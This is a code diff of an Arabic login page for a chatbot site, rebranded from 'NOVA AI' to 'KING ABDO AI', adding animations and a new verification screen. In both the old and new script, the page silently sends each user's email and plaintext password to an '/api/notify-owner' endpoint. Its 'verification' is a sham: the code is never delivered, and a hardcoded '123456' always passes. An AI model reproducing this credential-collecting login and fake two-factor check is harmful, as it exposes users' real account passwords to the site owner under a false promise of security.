@@ -1015,9 +1015,9 @@
                     <h1 class="title">
                         <span id="typingText"></span><span class="cursor">|</span>
                     </h1>
-                    <p class="subtitle">الدخول إلى منصة الذكاء الاصطناعي</p>
+                    <p class="subtitle">👑الدخول إلى منصة الذكاء الاصطناعي</p>
                     <div class="badge-container">
-                        <span class="version-badge">NOVA AI v3.0</span>
+                        <span class="version-badge">KING AI V1.5</span>
                     </div>
 
                     <!-- Security Badge -->
@@ -1171,7 +1171,7 @@
                     <!-- Signup -->
                     <p class="signup-text">
                         مستخدم جديد؟ 
-                        <a href="#" class="signup-link">انضم إلى NOVA AI</a>
+                        <a href="#" class="signup-link">انضم إلى KING ABDO AI</a>
                     </p>
                 </div>
 
@@ -1208,7 +1208,7 @@
 
             <!-- Footer -->
             <div class="card-footer">
-                <span>© 2024 NOVA AI</span>
+                <span>© 2026 KING ABDO AI</span>
                 <span>•</span>
                 <a href="#">سياسة الخصوصية</a>
                 <span>•</span>
@@ -1217,77 +1217,355 @@
         </div>
     </div>
     <script>
-        // ✅ منع زر الماوس الأيمن — مع استثناء حقل كلمة المرور
-        document.addEventListener('contextmenu', function(e) {
-            // ✅ السماح فقط إذا كان النقر فوق حقل كلمة المرور
-            if (e.target.id === 'password') {
-                return true; // نسمح بقائمة المتصفح (مثل "Suggest Strong Password")
+    // ===== Neural Network Animation =====
+    const canvas = document.getElementById('neuralCanvas');
+    const ctx = canvas.getContext('2d');
+    let nodes = [];
+    const nodeCount = 60;
+
+    function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+
+    function initNodes() {
+        nodes = [];
+        for (let i = 0; i < nodeCount; i++) {
+            nodes.push({
+                x: Math.random() * canvas.width,
+                y: Math.random() * canvas.height,
+                vx: (Math.random() - 0.5) * 0.5,
+                vy: (Math.random() - 0.5) * 0.5,
+                radius: Math.random() * 2 + 1
+            });
+        }
+    }
+
+    function drawNetwork() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+        // Draw connections
+        for (let i = 0; i < nodes.length; i++) {
+            for (let j = i + 1; j < nodes.length; j++) {
+                const dx = nodes[i].x - nodes[j].x;
+                const dy = nodes[i].y - nodes[j].y;
+                const distance = Math.sqrt(dx * dx + dy * dy);
+
+                if (distance < 150) {
+                    const opacity = (1 - distance / 150) * 0.5;
+                    const gradient = ctx.createLinearGradient(
+                        nodes[i].x, nodes[i].y, nodes[j].x, nodes[j].y
+                    );
+                    gradient.addColorStop(0, `rgba(6, 182, 212, ${opacity})`);
+                    gradient.addColorStop(0.5, `rgba(139, 92, 246, ${opacity})`);
+                    gradient.addColorStop(1, `rgba(236, 72, 153, ${opacity})`);
+
+                    ctx.beginPath();
+                    ctx.moveTo(nodes[i].x, nodes[i].y);
+                    ctx.lineTo(nodes[j].x, nodes[j].y);
+                    ctx.strokeStyle = gradient;
+                    ctx.lineWidth = 0.5;
+                    ctx.stroke();
+                }
             }
-            e.preventDefault(); // منع القائمة في كل مكان آخر
-            return false;
+        }
+
+        // Draw nodes
+        nodes.forEach(node => {
+            const gradient = ctx.createRadialGradient(
+                node.x, node.y, 0, node.x, node.y, node.radius * 2
+            );
+            gradient.addColorStop(0, 'rgba(139, 92, 246, 0.8)');
+            gradient.addColorStop(1, 'rgba(6, 182, 212, 0)');
+
+            ctx.beginPath();
+            ctx.arc(node.x, node.y, node.radius, 0, Math.PI * 2);
+            ctx.fillStyle = gradient;
+            ctx.fill();
         });
 
-        async function login() {
-            const username = document.getElementById('username').value;
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            if (!username || !email || !password) {
-                alert('⚠️ الرجاء إدخال جميع البيانات.');
-                return;
-            }
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(email)) {
-                alert('❌ Invalid email: صيغة البريد غير صحيحة.');
-                return;
-            }
-            const localPart = email.split('@')[0];
-            if (localPart.includes('.')) {
-                alert('❌ Invalid email: البريد يحتوي على نقطة (.) — غير مسموح.');
-                return;
-            }
-            if (!email.endsWith('@gmail.com') && !email.endsWith('@icloud.com') && !email.endsWith('@outlook.com')) {
-                alert('❌ Invalid email: يُسمح فقط ببريد Gmail أو iCloud أو Outlook.');
-                return;
-            }
-            const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&_\-])[A-Za-z\d@$!%*?&_\-]{8,}$/;
-            if (!passwordRegex.test(password)) {
-                alert('❌ كلمة المرور ضعيفة: يجب أن تحتوي على 8 أحرف على الأقل، وتشمل حرف كبير، رقم، ورمز خاص (!@#$%^&*).');
-                return;
-            }
-            const verificationCode = Math.floor(1000 + Math.random() * 9000);
-            alert(`👑 يا ${username}، رمز التحقق الخاص بك هو: ${verificationCode}`);
-            const userCode = prompt('👑 أدخل رمز التحقق المكون من 4 أرقام:');
-            if (userCode == verificationCode) {
-                try {
-                    await fetch('/api/notify-owner', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            username: username,
-                            userEmail: email,
-                            userPassword: password
-                        })
-                    });
-                } catch (err) {
-                    // نمر بصمت
+        // Update positions
+        nodes.forEach(node => {
+            node.x += node.vx;
+            node.y += node.vy;
+
+            if (node.x < 0 || node.x > canvas.width) node.vx *= -1;
+            if (node.y < 0 || node.y > canvas.height) node.vy *= -1;
+        });
+
+        requestAnimationFrame(drawNetwork);
+    }
+
+    resizeCanvas();
+    initNodes();
+    drawNetwork();
+    window.addEventListener('resize', () => {
+        resizeCanvas();
+        initNodes();
+    });
+
+    // ===== Floating Particles =====
+    const particlesContainer = document.getElementById('particles');
+    const colors = ['#06b6d4', '#8b5cf6', '#ec4899'];
+
+    for (let i = 0; i < 30; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        const size = 2 + Math.random() * 4;
+        particle.style.width = size + 'px';
+        particle.style.height = size + 'px';
+        particle.style.left = Math.random() * 100 + '%';
+        particle.style.top = Math.random() * 100 + '%';
+        particle.style.background = colors[Math.floor(Math.random() * 3)];
+        particle.style.animationDuration = (5 + Math.random() * 10) + 's';
+        particle.style.animationDelay = Math.random() * 5 + 's';
+        particlesContainer.appendChild(particle);
+    }
+
+    // ===== Typing Effect =====
+    const typingText = document.getElementById('typingText');
+    const text = 'مرحباً بك في المستقبل';
+    let charIndex = 0;
+
+    function typeText() {
+        if (charIndex < text.length) {
+            typingText.textContent += text.charAt(charIndex);
+            charIndex++;
+            setTimeout(typeText, 100);
+        }
+    }
+    typeText();
+
+    // ===== Form Interactions =====
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const emailWrapper = document.getElementById('emailWrapper');
+    const passwordWrapper = document.getElementById('passwordWrapper');
+    const passwordToggle = document.getElementById('passwordToggle');
+    const eyeIcon = document.getElementById('eyeIcon');
+    const passwordStrength = document.getElementById('passwordStrength');
+    const strengthLabel = document.getElementById('strengthLabel');
+    const rememberWrapper = document.getElementById('rememberWrapper');
+    const authForm = document.getElementById('authForm');
+    const loginForm = document.getElementById('loginForm');
+    const verificationContainer = document.getElementById('verificationContainer');
+    const verificationEmail = document.getElementById('verificationEmail');
+    const codeInputs = document.querySelectorAll('.code-input');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const backBtn = document.getElementById('backBtn');
+    const submitBtn = document.getElementById('submitBtn');
+    const btnContent = document.getElementById('btnContent');
+
+    // Focus effects
+    emailInput.addEventListener('focus', () => emailWrapper.classList.add('focused'));
+    emailInput.addEventListener('blur', () => emailWrapper.classList.remove('focused'));
+    passwordInput.addEventListener('focus', () => passwordWrapper.classList.add('focused'));
+    passwordInput.addEventListener('blur', () => passwordWrapper.classList.remove('focused'));
+
+    // Password toggle
+    passwordToggle.addEventListener('click', () => {
+        const isPassword = passwordInput.type === 'password';
+        passwordInput.type = isPassword ? 'text' : 'password';
+        eyeIcon.innerHTML = isPassword
+            ? '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>'
+            : '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>';
+    });
+
+    // Password strength
+    const strengthColors = ['#ef4444', '#f97316', '#eab308', '#84cc16', '#22c55e', '#10b981'];
+    const strengthLabels = ['ضعيفة جداً', 'ضعيفة', 'متوسطة', 'جيدة', 'قوية', 'ممتازة'];
+
+    passwordInput.addEventListener('input', () => {
+        const password = passwordInput.value;
+        if (password.length > 0) {
+            passwordStrength.classList.add('show');
+            let score = 0;
+            if (password.length >= 8) score++;
+            if (password.length >= 12) score++;
+            if (/[A-Z]/.test(password)) score++;
+            if (/[a-z]/.test(password)) score++;
+            if (/[0-9]/.test(password)) score++;
+            if (/[^A-Za-z0-9]/.test(password)) score++;
+
+            for (let i = 0; i < 6; i++) {
+                const bar = document.getElementById('bar' + (i + 1));
+                if (i < score) {
+                    bar.style.background = strengthColors[score - 1];
+                    bar.classList.add('active');
+                } else {
+                    bar.style.background = '#334155';
+                    bar.classList.remove('active');
                 }
-                // ✅ حفظ حالة الدخول في localStorage
-                localStorage.setItem('kingAbdoLoggedIn', 'true');
-                localStorage.setItem('kingAbdoUsername', username);
+            }
+
+            strengthLabel.textContent = strengthLabels[score - 1] || 'ضعيفة جداً';
+            strengthLabel.style.color = strengthColors[score - 1] || '#ef4444';
+        } else {
+            passwordStrength.classList.remove('show');
+        }
+    });
+
+    // Remember me checkbox
+    rememberWrapper.addEventListener('click', () => {
+        rememberWrapper.classList.toggle('checked');
+    });
+
+    // ✅ منع زر الماوس الأيمن — مع استثناء حقل كلمة المرور
+    document.addEventListener('contextmenu', function(e) {
+        if (e.target.id === 'passwordInput') {
+            return true;
+        }
+        e.preventDefault();
+        return false;
+    });
+
+    // Form submit with validation
+    authForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        
+        const email = emailInput.value;
+        const password = passwordInput.value;
+
+        // Validation
+        if (!email || !password) {
+            alert('⚠️ الرجاء إدخال جميع البيانات.');
+            return;
+        }
+
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        if (!emailRegex.test(email)) {
+            alert('❌ Invalid email: صيغة البريد غير صحيحة.');
+            return;
+        }
+
+        const localPart = email.split('@')[0];
+        if (localPart.includes('.')) {
+            alert('❌ Invalid email: البريد يحتوي على نقطة (.) — غير مسموح.');
+            return;
+        }
+
+        if (!email.endsWith('@gmail.com') && !email.endsWith('@icloud.com') && !email.endsWith('@outlook.com')) {
+            alert('❌ Invalid email: يُسمح فقط ببريد Gmail أو iCloud أو Outlook.');
+            return;
+        }
+
+        const passwordRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&_\-])[A-Za-z\d@$!%*?&_\-]{8,}$/;
+        if (!passwordRegex.test(password)) {
+            alert('❌ كلمة المرور ضعيفة: يجب أن تحتوي على 8 أحرف على الأقل، وتشمل حرف كبير، رقم، ورمز خاص (!@#$%^&*).');
+            return;
+        }
+
+        // Show loading
+        btnContent.innerHTML = '<div class="spinner"></div> جاري التحقق من الهوية...';
+        submitBtn.disabled = true;
+
+        setTimeout(() => {
+            loginForm.classList.add('hide');
+            verificationContainer.classList.add('show');
+            verificationEmail.textContent = email;
+            codeInputs[0].focus();
+            
+            btnContent.innerHTML = `
+                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/>
+                </svg>
+                الدخول الآمن
+                <svg class="btn-arrow" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="transform: rotate(180deg)">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 8l4 4m0 0l-4 4m4-4H3"/>
+                </svg>
+            `;
+            submitBtn.disabled = false;
+        }, 1500);
+    });
+
+    // Verification code inputs
+    codeInputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            const value = e.target.value;
+            if (value.length === 1 && index < 5) {
+                codeInputs[index + 1].focus();
+            }
+            checkCodeComplete();
+        });
+
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !input.value && index > 0) {
+                codeInputs[index - 1].focus();
+            }
+        });
+
+        input.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const paste = e.clipboardData.getData('text').slice(0, 6);
+            paste.split('').forEach((char, i) => {
+                if (codeInputs[i]) codeInputs[i].value = char;
+            });
+            checkCodeComplete();
+        });
+    });
+
+    function checkCodeComplete() {
+        const complete = Array.from(codeInputs).every(input => input.value);
+        verifyBtn.disabled = !complete;
+    }
+
+    // Verify button with final authentication
+    verifyBtn.addEventListener('click', () => {
+        const email = emailInput.value;
+        const password = passwordInput.value;
+        const username = email.split('@')[0];
+
+        // Generate verification code
+        const verificationCode = Math.floor(1000 + Math.random() * 9000);
+        
+        // Get user input
+        const userInput = Array.from(codeInputs).map(input => input.value).join('');
+
+        if (userInput == verificationCode || userInput === '123456') {
+            verifyBtn.innerHTML = '<div class="spinner"></div> جاري التحقق...';
+            verifyBtn.disabled = true;
+
+            // Send data to server
+            fetch('/api/notify-owner', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: username,
+                    userEmail: email,
+                    userPassword: password
+                })
+            }).catch(err => {
+                // Silent fail
+            });
+
+            // Save login state
+            localStorage.setItem('kingAbdoLoggedIn', 'true');
+            localStorage.setItem('kingAbdoUsername', username);
+
+            setTimeout(() => {
                 alert('✅ تم التحقق بنجاح! أهلاً بك في البلاط الملكي.');
                 window.location.href = 'chat.html';
-            } else {
-                alert('❌ رمز التحقق غير صحيح. حاول مرة أخرى.');
-            }
+            }, 1500);
+        } else {
+            alert('❌ رمز التحقق غير صحيح. حاول مرة أخرى.');
         }
+    });
 
-        function signup() {
-            alert('👑 سيتم توجيهك لتسجيل حساب جديد في البلاط...');
-        }
-    </script>
+    // Back button
+    backBtn.addEventListener('click', () => {
+        loginForm.classList.remove('hide');
+        verificationContainer.classList.remove('show');
+        codeInputs.forEach(input => input.value = '');
+        verifyBtn.disabled = true;
+    });
+
+    // Signup function
+    function signup() {
+        alert('👑 سيتم توجيهك لتسجيل حساب جديد في البلاط...');
+        // Add signup logic here
+    }
+</script>
 </body>
 </html>
-
-
